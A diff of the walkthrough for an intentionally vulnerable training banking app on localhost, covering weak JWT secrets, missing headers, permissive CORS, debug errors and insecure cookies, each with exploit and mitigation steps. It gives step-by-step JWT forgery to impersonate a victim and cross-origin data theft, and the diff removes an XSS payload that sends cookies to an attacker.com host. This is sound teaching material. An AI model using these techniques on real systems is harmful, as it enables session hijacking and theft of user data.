@@ -10,25 +10,10 @@ Security misconfiguration occurs when security settings are defined, implemented
 
 ## Configuration
 
-**Option 1: Runtime Toggle (Recommended for Testing)**
+**Runtime Toggle (Recommended for Testing)**
 
 Use the Security Hardening toggle on the dashboard at `http://localhost:5000/dashboard` to switch between vulnerable and hardened modes without restarting the application.
 
-**Option 2: Environment Variables (Persistent Configuration)**
-
-Set the following in your `.env` file:
-
-```
-SECURITY_HARDENING_ENABLED=false  # Vulnerable state
-FLASK_SECRET_KEY=secret123        # Weak secret key
-JWT_SECRET_KEY=secret123          # Weak JWT secret
-```
-
-Restart required after changing `.env` file:
-- Docker: `docker-compose down && docker-compose up -d`
-- Local: Stop server (Ctrl+C) and run `python app.py`
-
-## Demonstrations
 
 ### Weak Secret Keys
 
@@ -45,17 +30,17 @@ Allows attackers to forge session tokens and JWT tokens using easily guessable s
 4. Logout
 
 **Obtain Victim's Token Structure:**
-1. Login as `victim` at `http://localhost:5000`
+1. Login as `victim` at `http://localhost:5000/login`
 2. Press F12 → **Storage** tab (Firefox) or **Application** tab (Chrome)
 3. Click **Cookies** → `http://localhost:5000`
 4. Find the `token` cookie and copy its value (starts with `eyJ...`)
-5. Open `forge_jwt.html` and decode the token to see victim's `user_id`
+5. Open the JWT Forgery Tool at `http://localhost:5000/tools/forge-jwt` and decode the token to see victim's `user_id`
 6. Logout from victim account
 
 **Forge and Use Token:**
-1. Login as `attacker` at `http://localhost:5000`
+1. Login as `attacker` at `http://localhost:5000/login`
 2. F12 → **Cookies** → copy the `token` cookie value
-3. Open `forge_jwt.html` in your browser (double-click the file)
+3. Open the JWT Forgery Tool at `http://localhost:5000/tools/forge-jwt` in a new tab
 4. Paste attacker's token → Click "Decode Token"
 5. In Step 2, modify the payload:
    - Change `user_id` to victim's user_id (from earlier)
@@ -72,57 +57,25 @@ Allows attackers to forge session tokens and JWT tokens using easily guessable s
 
 **Important:** The server authenticates using the `token` **cookie**, not LocalStorage. You must replace the cookie value to use the forged token.
 
-##### Method 2: JWT Token Forgery via jwt.io (Alternative)
-
-1. Log in to your account
-2. Open browser developer tools (F12)
-3. Go to Application tab → Storage → Local Storage → `http://localhost:5000`
-4. Locate and copy the entire `jwt_token` value (long string starting with `eyJ...`)
-5. Open https://jwt.io in a new tab
-6. Paste your token into the "Encoded" section
-7. In the "Verify Signature" section at the bottom, enter:
-   ```
-   secret123
-   ```
-8. Observe the "Signature Verified" message appears
-
-**Expected Result (Vulnerable):** JWT signature verifies successfully with the weak secret `secret123`. An attacker can now:
-- Modify the payload (e.g., change `user_id`, `is_admin`)
-- Generate a new valid signature using `secret123`
-- Forge tokens to impersonate any user
-
-##### Method 3: Token Forgery via Browser Console
-
-1. Open browser console (F12 → Console)
-2. Execute the following to decode your current token:
-   ```javascript
-   const token = localStorage.getItem('jwt_token');
-   const payload = JSON.parse(atob(token.split('.')[1]));
-   console.log('Current token payload:', payload);
-   ```
-3. Note the `user_id` and `is_admin` values
-4. An attacker with knowledge of the weak secret (`secret123`) can forge tokens using libraries like PyJWT or online tools
-
 #### Mitigate
 
-1. Generate strong random secrets using Python:
-   ```bash
-   python -c "import secrets; print(secrets.token_urlsafe(32))"
-   ```
-   Run this command twice to generate two different secrets
-2. Update `.env` file with the generated secrets:
-   ```
-   SECURITY_HARDENING_ENABLED=true
-   FLASK_SECRET_KEY=your-generated-secret-key-here-32-chars-minimum
-   JWT_SECRET_KEY=your-other-generated-secret-key-here-32-chars-minimum
-   ```
-3. Restart the application:
-   - Docker: `docker-compose down && docker-compose up -d`
-   - Local: Stop server (Ctrl+C) and run `python app.py`
-4. Log in again (old tokens are now invalid)
-5. Copy your new JWT token and try to verify it on jwt.io using `secret123`
+**Using Runtime Toggle**
+1. Log out of the application
+2. Go to `http://localhost:5000/` and click "Enable Security Hardening" toggle
+3. Log in as `attacker` at `http://localhost:5000/login`
+4. F12 → **Cookies** → copy the `token` cookie value
+5. Open the JWT Forgery Tool at `http://localhost:5000/tools/forge-jwt`
+6. Paste attacker's token → Click "Decode Token"
+7. In Step 2, modify the payload:
+   - Change `user_id` to victim's user_id (same as the exploit)
+   - Change `username` to `"victim"`
+8. Click "Forge Token with New Payload" (still using `secret123` as the secret)
+9. Copy the forged token
+10. Back in browser: F12 → **Cookies** → double-click the `token` cookie **Value**
+11. Replace with your forged token → Press Enter
+12. Refresh the page (F5)
 
-**Expected Result (Protected):** JWT signature verification fails with `secret123`. The token can only be verified with the strong random secret, which attackers cannot guess.
+**Expected Result (Protected):** The forged token is rejected, the dashboard does NOT show victim's account information. Instead you will see an error upon refresh, because the token was signed with `secret123` but the server now uses a strong random secret. The same forgery steps that worked in the exploit no longer succeed.
 
 **Note on Token Expiration:** When hardening is enabled, tokens expire after 5 seconds (configured in `mitigations/session_exp.py`) for quick demonstration purposes. If you need tokens to last longer for extended testing, modify `timedelta(seconds=5)` to a longer duration in that file (e.g., `timedelta(hours=1)`).
 
@@ -133,58 +86,38 @@ Exposes application to clickjacking, MIME-type sniffing, and other attacks.
 #### Exploit
 
 1. Ensure Security Hardening is **disabled** (vulnerable mode)
-2. Log in to your account
-3. Open browser developer tools (F12)
-4. Go to Network tab
-5. Refresh the page
-6. Click on any request to the application
-7. Go to Headers tab and check Response Headers
-8. Observe missing security headers:
-   - No `X-Content-Type-Options`
-   - No `X-Frame-Options`
-   - No `X-XSS-Protection`
-   - No `Strict-Transport-Security`
+2. Log in to your account at `http://localhost:5000/login`
+3. Press F12 to open browser DevTools
+4. Click the **Network** tab at the top of the DevTools panel
+5. Refresh the page (F5) — a list of network requests will appear
+6. Click on the first request in the list (usually named `dashboard`)
+7. In the detail panel that opens, look for a **Headers** sub-tab and click it
+8. Scroll down to the **Response Headers** section
+9. Look for the following headers — they should all be **missing**:
+   - `Strict-Transport-Security`
+   - `X-Content-Type-Options`
+   - `X-Frame-Options`
+   - `X-XSS-Protection`
 
-**Expected Result (Vulnerable):** Security headers are absent from responses.
+**Expected Result (Vulnerable):** None of the four security headers appear in the Response Headers. The server is not sending any protections against clickjacking, MIME-sniffing, or other browser-level attacks.
 
 #### Mitigate
 
-**Option 1: Using Runtime Toggle (Recommended)**
-1. Go to `http://localhost:5000/dashboard`
-2. Click "Enable Security Hardening" toggle
-3. Open DevTools (F12) → Network tab
-4. Refresh the page
-5. Click on the main document request (usually the first one, named `dashboard`)
-6. Go to the Headers tab → Response Headers section
-7. Look for the security headers
-
-**Option 2: Using Environment Variables**
-1. Update `.env` file:
-   ```
-   SECURITY_HARDENING_ENABLED=true
-   ```
-2. Restart the application:
-   - Docker: `docker-compose down && docker-compose up -d`
-   - Local: Stop server (Ctrl+C) and run `python app.py`
-3. Follow steps 3-7 above
-
-**Alternative: Check via Browser Console**
-```javascript
-fetch(window.location.href)
-    .then(response => {
-        console.log('Security Headers:');
-        console.log('X-Content-Type-Options:', response.headers.get('X-Content-Type-Options'));
-        console.log('X-Frame-Options:', response.headers.get('X-Frame-Options'));
-        console.log('X-XSS-Protection:', response.headers.get('X-XSS-Protection'));
-        console.log('Strict-Transport-Security:', response.headers.get('Strict-Transport-Security'));
-    });
-```
+**Using Runtime Toggle**
+1. Log out of the application
+2. Go to `http://localhost:5000/` and click "Enable Security Hardening" toggle
+3. Log back in at `http://localhost:5000/login`
+4. Press F12 to open browser DevTools → click the **Network** tab
+5. Refresh the page (F5)
+6. Click on the first request in the list (usually named `dashboard`)
+7. Click the **Headers** sub-tab → scroll down to **Response Headers**
+8. Look for the same four headers, they should now be **present**
 
 **Expected Result (Protected):** Response includes security headers:
+- `Strict-Transport-Security: max-age=31536000; includeSubDomains` - Forces HTTPS
 - `X-Content-Type-Options: nosniff` - Prevents MIME-type sniffing
 - `X-Frame-Options: DENY` - Prevents clickjacking
 - `X-XSS-Protection: 1; mode=block` - Enables browser XSS filter
-- `Strict-Transport-Security: max-age=31536000; includeSubDomains` - Forces HTTPS
 
 ### Permissive CORS Policy
 
@@ -195,24 +128,19 @@ Allows any origin to make cross-origin requests, exposing sensitive data.
 ##### Method 1: Malicious HTML Page Attack
 
 1. Ensure Security Hardening is **disabled** (vulnerable mode)
-2. Ensure you are logged into Vulnerable Bank (http://localhost:5000) in your browser
+2. Ensure you are logged in and on the dashboard(http://localhost:5000/dashboard) in your browser
 3. Open the included `attack.html` file by double-clicking it (located in the project root)
    - The file opens with `file://` origin (simulating a malicious website)
    - It provides two attack buttons with visual feedback
 4. Click "Launch Attack on /api/security-config"
 5. Click "Launch Attack on /check_balance/ACC1001"
 
-**Expected Result (Vulnerable):**
-- Both attacks show red "ATTACK SUCCEEDED" boxes
-- Stolen security configuration data is displayed
-- Balance data is returned (even with invalid token, shows error message was accessible)
-- Console shows successful cross-origin requests from `file://` origin
-- CORS allows requests from any origin including `null` (file://)
+**Expected Result (Vulnerable):** Both attacks show red "ATTACK SUCCEEDED" boxes. Attack 1 displays the full security configuration JSON stolen from the server. Attack 2 returns a response from the balance endpoint, even though it shows `{"error": "Invalid token"}` (because `attack.html` has no valid auth cookie), the important thing is that the cross-origin request was **not blocked**. The server responded with `Access-Control-Allow-Origin: *`, which means any website can read the response. With a proper CORS policy, the browser would block the response entirely and no data would be returned at all.
 
 ##### Method 2: Via Browser Console (Quick Test)
 
 1. Ensure Security Hardening is **disabled** (vulnerable mode)
-2. Log into Vulnerable Bank at http://localhost:5000
+2. Log into Vulnerable Bank at http://localhost:5000/login
 3. Open a completely different website (e.g., google.com) in a new tab
 4. Open browser console on that tab
 5. Execute:
@@ -223,11 +151,11 @@ Allows any origin to make cross-origin requests, exposing sensitive data.
        .catch(e => console.log('Blocked by CORS:', e));
    ```
 
-**Expected Result (Vulnerable):** Request succeeds and returns data despite originating from a different domain.
+**Expected Result (Vulnerable):** The console prints the stolen security configuration JSON. This request originated from a completely different domain (e.g., google.com), yet the server accepted it and returned readable data. This is because the server's `Access-Control-Allow-Origin: *` header tells the browser to allow any origin to read the response.
 
 #### Mitigate
 
-**Option 1: Using Runtime Toggle (No Restart Required)**
+**Option 1: Using Runtime Toggle**
 1. Go to http://localhost:5000
 2. Enable the "Global Security Hardening" toggle at the top of the page
 3. Open `attack.html` and click both attack buttons
@@ -244,11 +172,7 @@ Allows any origin to make cross-origin requests, exposing sensitive data.
    - Local: Stop and run `python app.py`
 3. Open `attack.html` and click both attack buttons
 
-**Expected Result (Protected):**
-- Both attacks show green "ATTACK BLOCKED BY CORS!" boxes
-- Browser console shows CORS error: `Failed to fetch`
-- Server returns 403 Forbidden for cross-origin requests
-- Only requests from `http://localhost:5000` are allowed
+**Expected Result (Protected):** Both attacks show green "ATTACK BLOCKED BY CORS!" boxes. The browser console shows a CORS error (`Failed to fetch`) because the server no longer sends `Access-Control-Allow-Origin: *`. Instead, it only allows requests from `http://localhost:5000`, so the browser blocks the `attack.html` page (which runs from the `file://` origin) from reading any response. The same requests that succeeded before are now completely blocked at the browser level.
 
 ### Debug Mode in Production
 
@@ -304,22 +228,22 @@ Exposes detailed error messages and debug endpoints with sensitive information.
    .then(data => console.log('ERROR:', JSON.stringify(data, null, 2)));
    ```
 4. Observe the detailed error response includes:
-   - `error_type`: Exception class name (e.g., "NotNullViolation", "IntegrityError")
+   - `status`: Error status
+   - `message`: Full database constraint violation details (table name, column name, row contents)
+   - `error_type`: Exception class name (e.g., "NotNullViolation")
    - `timestamp`: Exact time of the error
    - `debug_info`: Endpoint name and detailed error information
-   - `message`: Full database constraint violation details
-   - Internal variable names and values
 
-**Expected Result (Vulnerable):** Error responses contain detailed diagnostic information revealing internal application structure:
+**Expected Result (Vulnerable):** The console shows a `500 INTERNAL SERVER ERROR` with detailed diagnostic information revealing internal application structure:
 ```json
 {
   "status": "error",
-  "message": "null value in column \"payment_method\" violates not-null constraint...",
+  "message": "null value in column \"payment_method\" of relation \"bill_payments\" violates not-null constraint\nDETAIL:  Failing row contains (14, 3, 999999, -100.00, null, null, BILL..., pending, 2026-..., null, Bill Payment).\n",
   "error_type": "NotNullViolation",
-  "timestamp": "2026-01-29 05:24:03.523966",
+  "timestamp": "2026-02-09 04:09:22.562588",
   "debug_info": {
-    "endpoint": "create_bill_payment",
-    "error_details": "DETAIL: Failing row contains..."
+    "endpoint": "unknown_endpoint",
+    "error_details": "null value in column \"payment_method\" of relation \"bill_payments\" violates not-null constraint\nDETAIL:  Failing row contains (14, 3, 999999, -100.00, null, null, BILL..., pending, 2026-..., null, Bill Payment).\n"
   }
 }
 ```
@@ -374,12 +298,12 @@ fetch('/api/bill-payments/create', {
 ```
 
 **Notice what's MISSING in hardened mode:**
-- ✗ No `error_type` (exception class names)
-- ✗ No `timestamp` (error timing information)
-- ✗ No `debug_info` (endpoint details)
-- ✗ No database constraint details
-- ✗ No stacktraces or file paths
-- ✗ No internal variable names
+- No `error_type` (exception class names)
+- No `timestamp` (error timing information)
+- No `debug_info` (endpoint details)
+- No database constraint details
+- No stacktraces or file paths
+- ✗No internal variable names
 
 ### Insecure Cookie Configuration
 
@@ -390,13 +314,13 @@ Session cookies lack security flags, exposing them to interception and XSS attac
 ##### Method 1: Inspecting Cookie Security via DevTools
 
 1. Ensure Security Hardening is **disabled** (vulnerable mode)
-2. Log in to your account at http://localhost:5000
+2. Log in to your account at http://localhost:5000/login
 3. Open browser developer tools (F12)
 4. Go to Application tab → Storage → Cookies → `http://localhost:5000`
 5. Locate the `token` cookie in the list
 6. Examine the cookie properties columns:
-   - **Secure**: Should show ✗ (checkmark missing - allows HTTP transmission)
-   - **HttpOnly**: Should show ✗ (allows JavaScript access)
+   - **Secure**: Should show false
+   - **HttpOnly**: Should show false
    - **SameSite**: Shows "None" or blank (vulnerable to CSRF)
 7. Note the cookie value (your session token)
 
@@ -424,11 +348,7 @@ Session cookies lack security flags, exposing them to interception and XSS attac
    }
    ```
 
-**Expected Result (Vulnerable):** Console displays the session token. An XSS attack could execute similar code to steal the token:
-```javascript
-// Malicious XSS payload that would exfiltrate the cookie
-fetch('https://attacker.com/steal?cookie=' + document.cookie);
-```
+**Expected Result (Vulnerable):** Console displays the session token. An XSS attack could execute similar code to steal the token
 
 ##### Method 3: Demonstrating Missing Secure Flag
 
@@ -451,15 +371,21 @@ fetch('https://attacker.com/steal?cookie=' + document.cookie);
 #### Mitigate
 
 **Option 1: Using Runtime Toggle (Recommended)**
-1. Go to `http://localhost:5000/dashboard`
-2. Click "Enable Security Hardening" toggle
-3. Log out and log in again (to get a new secure cookie)
-4. Open DevTools → Application → Cookies
-5. Examine the `token` cookie properties
-6. Try accessing the cookie via JavaScript:
+1. Go to `http://localhost:5000` and enable the "Global Security Hardening" toggle
+2. Log back in at `http://localhost:5000/login` to receive a new secure cookie
+3. Open DevTools (F12) → Application tab → Storage → Cookies → `http://localhost:5000`
+4. Examine the `token` cookie properties (corresponds to Method 1):
+   - **Secure**: Still false — expected on HTTP localhost, only set over HTTPS
+   - **HttpOnly**: `True` (now set)
+   - **SameSite**: `Strict` (now set)
+5. Open the Console tab and try accessing the cookie via JavaScript (corresponds to Method 2):
    ```javascript
-   console.log('Trying to access cookie:', document.cookie);
-   // Should no longer show the token cookie
+   const cookie = document.cookie;
+   if (cookie && cookie.includes('token=')) {
+       console.log('Token stolen:', cookie);
+   } else {
+       console.log('Access denied, HttpOnly flag prevents JavaScript from reading the token cookie');
+   }
    ```
 
 **Option 2: Using Environment Variables**
@@ -471,33 +397,10 @@ fetch('https://attacker.com/steal?cookie=' + document.cookie);
    - Docker: `docker-compose down && docker-compose up -d`
    - Local: Stop server (Ctrl+C) and run `python app.py`
 3. Log out and log in again (to get a new secure cookie)
-4. Follow steps 4-6 above
+4. Follow steps 3-5 from Option 1
 
 **Expected Result (Protected):**
-- **DevTools shows secure flags:**
-  - `Secure`: ✓ (HTTPS-only, prevents transmission over unencrypted connections)
-  - `HttpOnly`: ✓ (prevents JavaScript access via `document.cookie`)
-  - `SameSite`: `Strict` (prevents CSRF attacks by blocking cross-site requests)
-- **Console shows:** The `token` cookie is missing from `document.cookie` output (empty string or no token visible)
-- **Cookie cannot be stolen** via XSS attacks (HttpOnly protection)
-- **CSRF attacks prevented** by SameSite=Strict
+- **DevTools (Method 1):** HttpOnly and SameSite flags are now set. Secure remains false on HTTP localhost but would be set over HTTPS.
+- **Console (Method 2):** Prints "Access denied" — the token cookie is no longer accessible via `document.cookie` because HttpOnly is set.
+- **Method 3:** Cookie is still sent over HTTP on localhost, but in a production HTTPS deployment the Secure flag would prevent transmission over unencrypted connections.
 
-## Technical Details
-
-**Vulnerable Configuration:**
-- Weak secret keys (`secret123`)
-- No security headers
-- Permissive CORS (`*` or broad origins)
-- Debug mode enabled in production
-- Insecure cookie flags
-
-**Hardened Configuration:**
-- Strong random secret keys (32+ characters)
-- Comprehensive security headers
-- Restricted CORS to specific origins
-- Debug mode disabled
-- Secure cookie configuration
-
-Affected files:
-- `app.py`: Security configuration and header management
-- `.env.example`: Environment variable documentation
